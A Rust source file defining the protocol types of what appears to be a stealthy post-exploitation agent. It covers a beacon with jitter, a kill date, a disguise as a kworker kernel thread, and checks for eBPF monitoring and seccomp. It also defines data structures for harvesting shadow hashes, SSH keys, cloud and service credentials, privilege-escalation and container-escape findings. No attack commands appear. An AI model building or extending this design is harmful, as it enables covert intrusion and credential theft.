use serde::{Deserialize, Serialize};
use zeroize::Zeroize;

/// Unique session identifier assigned by the handler.
pub type SessionId = u32;

/// Unique task identifier for tracking command execution.
pub type TaskId = u32;

/// Channel identifier for multiplexed connections (forwarding, socks).
pub type ChannelId = u32;

/// Protocol version — increment on breaking changes.
pub const PROTOCOL_VERSION: u8 = 2;

/// Maximum frame size (4 MB). Prevents memory exhaustion from malformed frames.
pub const MAX_FRAME_SIZE: usize = 4 * 1024 * 1024;

/// Default beacon interval in seconds.
pub const DEFAULT_BEACON_INTERVAL: u64 = 30;

/// Default jitter percentage (±30%).
pub const DEFAULT_JITTER_PERCENT: u8 = 30;

/// Agent metadata sent during handshake.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentInfo {
    pub version: String,
    pub hostname: String,
    pub os_release: String,
    pub kernel: String,
    pub arch: String,
    pub uid: u32,
    pub gid: u32,
    pub username: String,
    pub pid: u32,
    pub process_name: String,
    /// Execution environment capabilities (probed at startup).
    pub exec_capabilities: ExecCapabilitiesReport,
    /// Whether eBPF-based monitoring was detected.
    pub ebpf_detected: bool,
    /// Seccomp filter mode (0=disabled, 1=strict, 2=filter).
    pub seccomp_mode: u8,
}

/// Execution capability report sent to handler during handshake.
/// Handler uses this to decide payload delivery strategy.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecCapabilitiesReport {
    /// memfd_create available (preferred in-memory execution).
    pub memfd_create: bool,
    /// /dev/shm writable and executable.
    pub shm_exec: bool,
    /// /tmp writable and executable.
    pub tmp_exec: bool,
    /// Mount points with noexec flag.
    pub noexec_mounts: Vec<String>,
}

/// Agent configuration — mutable at runtime via ConfigUpdate messages.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    pub beacon_interval_secs: u64,
    pub jitter_percent: u8,
    pub noise_level: crate::NoiseLevel,
    pub max_retry_interval_secs: u64,
    pub kill_date: Option<u64>,
    pub disguise_name: String,
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            beacon_interval_secs: DEFAULT_BEACON_INTERVAL,
            jitter_percent: DEFAULT_JITTER_PERCENT,
            noise_level: crate::NoiseLevel::Silent,
            max_retry_interval_secs: 600,
            kill_date: None,
            disguise_name: "[kworker/0:1-events]".into(),
        }
    }
}

/// Structured result from a reconnaissance module.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModuleResult {
    pub module: String,
    pub noise_level: crate::NoiseLevel,
    pub timestamp: u64,
    pub duration_ms: u64,
    pub data: ModuleData,
    pub findings: Vec<Finding>,
}

/// Typed data returned by each recon module.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ModuleData {
    Sysinfo(SysinfoData),
    Users(UsersData),
    Network(NetworkData),
    Processes(ProcessesData),
    Filesystem(FilesystemData),
    ContainerDetect(ContainerData),
    Credentials(CredentialsData),
    PrivEsc(PrivEscData),
    Harvest(HarvestData),
    Raw(Vec<u8>),
}

// ── Per-module data structures ──────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SysinfoData {
    pub hostname: String,
    pub os: String,
    pub kernel: String,
    pub arch: String,
    pub cpu_model: String,
    pub cpu_cores: usize,
    pub mem_total: String,
    pub mem_available: String,
    pub uptime_secs: u64,
    pub container_type: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UsersData {
    pub current_uid: u32,
    pub current_gid: u32,
    pub current_euid: u32,
    pub current_username: String,
    pub login_users: Vec<LoginUser>,
    pub sudoers_rules: Vec<String>,
    pub active_sessions: Vec<ActiveSession>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LoginUser {
    pub username: String,
    pub uid: u32,
    pub home: String,
    pub shell: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ActiveSession {
    pub pid: u32,
    pub username: String,
    pub process_name: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkData {
    pub interfaces: Vec<NetworkInterface>,
    pub listening_ports: Vec<PortInfo>,
    pub established: Vec<PortInfo>,
    pub routes: Vec<RouteInfo>,
    pub dns_servers: Vec<String>,
    pub arp_entries: Vec<ArpEntry>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkInterface {
    pub name: String,
    pub mac: String,
    pub state: String,
    pub mtu: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PortInfo {
    pub addr: String,
    pub port: u16,
    pub uid: u32,
    pub username: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RouteInfo {
    pub iface: String,
    pub destination: String,
    pub gateway: String,
    pub mask: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ArpEntry {
    pub ip: String,
    pub mac: String,
    pub device: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessesData {
    pub total_count: usize,
    pub processes: Vec<ProcessEntry>,
    pub interesting: Vec<InterestingProcess>,
    pub security_tools: Vec<InterestingProcess>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessEntry {
    pub pid: u32,
    pub ppid: u32,
    pub uid: u32,
    pub name: String,
    pub cmdline: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InterestingProcess {
    pub pid: u32,
    pub name: String,
    pub cmdline: String,
    pub username: String,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FilesystemData {
    pub mounts: Vec<MountInfo>,
    pub suid_files: Vec<SuidFile>,
    pub sgid_files: Vec<SuidFile>,
    pub writable_dirs: Vec<String>,
    pub interesting_files: Vec<InterestingFile>,
    pub capabilities: CapabilityInfo,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MountInfo {
    pub device: String,
    pub mountpoint: String,
    pub fstype: String,
    pub options: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SuidFile {
    pub path: String,
    pub owner_uid: u32,
    pub mode: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InterestingFile {
    pub path: String,
    pub readable: bool,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CapabilityInfo {
    pub effective: String,
    pub permitted: String,
    pub bounding: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ContainerData {
    pub container_type: Option<String>,
    pub evidence: Vec<String>,
    pub k8s_info: Option<K8sInfo>,
    pub namespaces: Vec<NamespaceInfo>,
    pub escape_vectors: Vec<EscapeVector>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct K8sInfo {
    pub namespace: String,
    pub service_account: String,
    pub token_present: bool,
    pub ca_cert_present: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NamespaceInfo {
    pub ns_type: String,
    pub self_inode: String,
    pub init_inode: String,
    pub shared: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EscapeVector {
    pub name: String,
    pub description: String,
    pub severity: Severity,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CredentialsData {
    pub shadow_entries: Vec<ShadowEntry>,
    pub ssh_keys: Vec<SshKeyInfo>,
    pub history_secrets: Vec<HistorySecret>,
    pub env_secrets: Vec<EnvSecret>,
    pub cloud_creds: Vec<CloudCredential>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShadowEntry {
    pub username: String,
    pub hash_type: String,
    pub has_password: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SshKeyInfo {
    pub path: String,
    pub key_type: String,
    pub encrypted: bool,
    pub owner_uid: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HistorySecret {
    pub file: String,
    pub line: String,
    pub pattern: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnvSecret {
    pub key: String,
    pub value_preview: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CloudCredential {
    pub provider: String,
    pub path: String,
    pub credential_type: String,
}

// ── Privilege Escalation ─────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PrivEscData {
    pub kernel_version: String,
    pub kernel_cves: Vec<KernelCve>,
    pub sudo_vectors: Vec<SudoVector>,
    pub writable_path_dirs: Vec<String>,
    pub cron_vectors: Vec<CronVector>,
    pub group_vectors: Vec<GroupVector>,
    pub writable_sensitive: Vec<WritableSensitive>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KernelCve {
    pub cve: String,
    pub name: String,
    pub affected_range: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SudoVector {
    pub rule: String,
    pub vector: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CronVector {
    pub cron_file: String,
    pub script_path: String,
    pub writable: bool,
    pub wildcard: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GroupVector {
    pub group_name: String,
    pub gid: u32,
    pub exploit: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WritableSensitive {
    pub path: String,
    pub impact: String,
}

// ── Credential Harvesting ───────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HarvestData {
    pub db_credentials: Vec<DbCredential>,
    pub web_configs: Vec<WebConfig>,
    pub service_tokens: Vec<ServiceToken>,
    pub app_credentials: Vec<AppCredential>,
    pub network_credentials: Vec<NetworkCredential>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DbCredential {
    pub db_type: String,
    pub path: String,
    pub username: Option<String>,
    pub has_password: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WebConfig {
    pub path: String,
    pub config_type: String,
    pub secrets_found: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ServiceToken {
    pub service: String,
    pub path: String,
    pub token_preview: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AppCredential {
    pub app: String,
    pub path: String,
    pub credential_type: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkCredential {
    pub service: String,
    pub path: String,
    pub has_password: bool,
}

// ── Findings ────────────────────────────────────────────────────

/// A highlighted discovery from a module.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    pub severity: Severity,
    pub category: FindingCategory,
    pub title: String,
    pub detail: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Severity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum FindingCategory {
    PrivEsc,
    Credential,
    Misconfiguration,
    Container,
    Network,
    Persistence,
    Defense,
    Info,
}

/// Task execution result sent back to handler.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResult {
    pub task_id: TaskId,
    pub success: bool,
    pub exit_code: Option<i32>,
    pub stdout: Vec<u8>,
    pub stderr: Vec<u8>,
    pub duration_ms: u64,
}

/// File transfer metadata.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileInfo {
    pub path: String,
    pub size: u64,
    pub sha256: [u8; 32],
    pub chunk_size: u32,
    pub total_chunks: u32,
}

/// A single chunk of a file transfer.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileChunk {
    pub sequence: u32,
    pub data: Vec<u8>,
    pub crc32: u32,
}

/// Pre-shared key for agent authentication.
/// Zeroized on drop to prevent memory leaks.
#[derive(Clone, Zeroize)]
#[zeroize(drop)]
pub struct Psk(pub [u8; 32]);

impl Psk {
    pub fn from_passphrase(passphrase: &str) -> Self {
        use sha2::{Digest, Sha256};
        let hash = Sha256::digest(passphrase.as_bytes());
        let mut key = [0u8; 32];
        key.copy_from_slice(&hash);
        Self(key)
    }
}

impl std::fmt::Debug for Psk {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "Psk([REDACTED])")
    }
}
